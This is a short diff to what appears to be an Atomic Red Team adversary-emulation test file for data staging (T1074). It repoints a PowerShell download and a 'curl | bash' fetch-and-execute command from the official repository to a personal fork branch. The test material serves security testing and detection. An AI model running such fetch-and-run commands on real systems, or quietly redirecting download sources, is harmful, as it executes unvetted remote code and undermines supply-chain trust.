@@ -22,7 +22,7 @@ atomic_tests:
     name: powershell
     elevation_required: false
     command: |
-      Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat" -OutFile #{output_file}
+      Invoke-WebRequest "https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1074/src/Discovery.bat" -OutFile #{output_file}
     cleanup_command: |
       Remove-Item -Force #{output_file} -ErrorAction Ignore
 
@@ -42,7 +42,7 @@ atomic_tests:
   executor:
     name: bash
     command: |
-      curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > #{output_file}
+      curl -s https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1074/src/Discovery.sh | bash -s > #{output_file}
 
 - name: Zip a Folder with PowerShell for Staging in Temp
   auto_generated_guid: a57fbe4b-3440-452a-88a7-943531ac872a
